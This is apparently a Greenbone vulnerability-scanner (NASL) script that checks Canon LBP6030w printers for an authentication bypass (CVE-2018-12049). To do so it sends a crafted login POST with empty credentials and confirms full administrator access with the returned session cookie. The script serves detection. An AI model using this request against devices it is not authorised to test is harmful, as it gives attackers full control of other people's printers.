CPE = "cpe:/h:canon:lbp6030w";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.813607" );
	script_version( "2021-06-24T11:00:30+0000" );
	script_cve_id( "CVE-2018-12049" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "last_modification", value: "2021-06-24 11:00:30 +0000 (Thu, 24 Jun 2021)" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2018-08-01 12:11:00 +0000 (Wed, 01 Aug 2018)" );
	script_tag( name: "creation_date", value: "2018-06-15 12:23:19 +0530 (Fri, 15 Jun 2018)" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_name( "Canon LBP6030w Authentication Bypass Vulnerability" );
	script_tag( name: "summary", value: "The host is installed with Canon Printer
  and is prone to authentication bypass vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET
  request and check whether it is able to bypass authentication or not." );
	script_tag( name: "insight", value: "The flaw is due to an improper
  authentication mechanism for the System Manager Mode on the Canon LBP6030w
  web interface." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to bypass the System Manager Mode and get full access to the device." );
	script_tag( name: "affected", value: "Canon Printer LBP6030w." );
	script_tag( name: "solution", value: "The vendor reportedly responded that this issue occurs when a customer keeps
the default settings without using the countermeasures and best practices shown in the documentation." );
	script_tag( name: "solution_type", value: "Workaround" );
	script_xref( name: "URL", value: "https://www.exploit-db.com/exploits/44886" );
	script_xref( name: "URL", value: "https://packetstormsecurity.com/files/148162" );
	script_xref( name: "URL", value: "https://global.canon/en/index.html" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2018 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_canon_printers_detect.sc" );
	script_mandatory_keys( "canon_printer_model" );
	script_require_ports( "Services/www", 80 );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("misc_func.inc.sc");
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
login_data = "iToken=&i0012=1&i0016=";
req = http_post_put_req( port: http_port, url: "/checkLogin.cgi", data: "iToken=&i0012=1&i0016=", accept_header: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" );
res = http_keepalive_send_recv( port: http_port, data: req );
if(egrep( string: res, pattern: "Set-Cookie", icase: TRUE )){
	cookie_match = eregmatch( string: res, pattern: "[Ss]et-[Cc]ookie: sessid=([^\r\n]+);" );
	if(isnull( cookie_match[1] )){
		exit( 0 );
	}
	cookie = cookie_match[1];
	url = "/portal_top.html";
	cookie_header = make_array( "Cookie", "sessid=" + cookie );
	req = http_get_req( port: http_port, url: url, add_headers: cookie_header );
	res = http_keepalive_send_recv( data: req, port: http_port );
	if(ContainsString( res, "userName\">System&nbsp;Manager" ) && ContainsString( res, ">Log Out<" ) && ContainsString( res, ">Copyright CANON INC" ) && IsMatchRegexp( res, "<title>Remote UI: Portal: LBP6030w.*</title>" )){
		report = http_report_vuln_url( port: http_port, url: url );
		security_message( data: report, port: http_port );
		exit( 0 );
	}
}
exit( 0 );

